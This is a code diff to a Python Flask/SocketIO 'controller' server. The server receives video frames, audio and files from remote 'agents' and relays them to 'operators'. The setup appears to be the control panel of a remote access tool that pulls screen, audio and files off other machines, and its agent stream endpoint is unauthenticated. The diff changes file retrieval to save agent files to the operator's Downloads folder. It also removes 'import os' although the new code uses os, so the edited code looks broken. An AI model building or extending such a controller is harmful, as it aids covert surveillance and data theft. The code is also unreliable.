@@ -1,4 +1,3 @@
-#final controller
 import eventlet
 eventlet.monkey_patch()
 
@@ -13,8 +12,6 @@ import queue
 import hashlib
 import hmac
 import secrets
-import os
-import base64
 
 # Configuration Management
 class Config:
@@ -1745,8 +1742,14 @@ AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())
 @app.route('/stream/<agent_id>', methods=['POST'])
 # No authentication required for agent ingestion
 def stream_in(agent_id):
-    VIDEO_FRAMES[agent_id] = request.data
-    return "OK", 200
+    # Optimized for ultra-low latency streaming
+    try:
+        VIDEO_FRAMES[agent_id] = request.data
+        # Return immediately for minimal latency
+        return "OK", 200
+    except Exception as e:
+        print(f"Stream error for agent {agent_id}: {e}")
+        return "Error", 500
 
 def generate_video_frames(agent_id):
     while True:
@@ -1953,7 +1956,8 @@ def handle_file_chunk_from_agent(data):
     error = data.get('error')
 
     if error:
-        emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'error': error}, room='operators')
+        # Only send error status to frontend, no file data
+        emit('file_download_status', {'agent_id': agent_id, 'filename': filename, 'error': error}, room='operators')
         if filename in DOWNLOAD_BUFFERS: del DOWNLOAD_BUFFERS[filename]
         return
 
@@ -1977,36 +1981,47 @@ def handle_file_chunk_from_agent(data):
                 with open(local_path, 'wb') as f:
                     f.write(full_content)
                 print(f"Successfully downloaded {filename} to {local_path}")
-                emit('file_download_chunk', {
+                # Send only status to frontend, no file data
+                emit('file_download_status', {
                     'agent_id': agent_id,
                     'filename': filename,
-                    'chunk': chunk,
-                    'offset': offset,
-                    'total_size': total_size,
-                    'local_path': local_path # Pass local_path back to frontend
+                    'status': 'completed',
+                    'local_path': local_path,
+                    'file_size': len(full_content)
                 }, room='operators')
             except Exception as e:
                 print(f"Error saving downloaded file {filename} to {local_path}: {e}")
-                emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'error': f'Error saving to local path: {e}'}, room='operators')
+                emit('file_download_status', {'agent_id': agent_id, 'filename': filename, 'error': f'Error saving to local path: {e}'}, room='operators')
         else:
-            # If no local_path was specified, send the chunks to the frontend for browser download
-            emit('file_download_chunk', {
-                'agent_id': agent_id,
-                'filename': filename,
-                'chunk': chunk,
-                'offset': offset,
-                'total_size': total_size
-            }, room='operators')
+            # If no local_path specified, save to default downloads folder
+            default_path = os.path.join(os.path.expanduser("~"), "Downloads", filename)
+            try:
+                os.makedirs(os.path.dirname(default_path), exist_ok=True)
+                with open(default_path, 'wb') as f:
+                    f.write(full_content)
+                print(f"Successfully downloaded {filename} to {default_path}")
+                emit('file_download_status', {
+                    'agent_id': agent_id,
+                    'filename': filename,
+                    'status': 'completed',
+                    'local_path': default_path,
+                    'file_size': len(full_content)
+                }, room='operators')
+            except Exception as e:
+                print(f"Error saving downloaded file {filename} to {default_path}: {e}")
+                emit('file_download_status', {'agent_id': agent_id, 'filename': filename, 'error': f'Error saving to default path: {e}'}, room='operators')
         
         del DOWNLOAD_BUFFERS[filename]
     else:
-        # Continue sending chunks to frontend for progress update
-        emit('file_download_chunk', {
+        # Send progress update only, no file data
+        progress_percent = int((current_download_size / total_size) * 100) if total_size > 0 else 0
+        emit('file_download_status', {
             'agent_id': agent_id,
             'filename': filename,
-            'chunk': chunk,
-            'offset': offset,
-            'total_size': total_size
+            'status': 'progress',
+            'progress': progress_percent,
+            'received': current_download_size,
+            'total': total_size
         }, room='operators')
 
 
@@ -2020,4 +2035,3 @@ if __name__ == "__main__":
     print(f"Password security: PBKDF2-SHA256 with {Config.HASH_ITERATIONS:,} iterations")
     print(f"Salt length: {Config.SALT_LENGTH} bytes")
     socketio.run(app, host=Config.HOST, port=Config.PORT, debug=False)
-
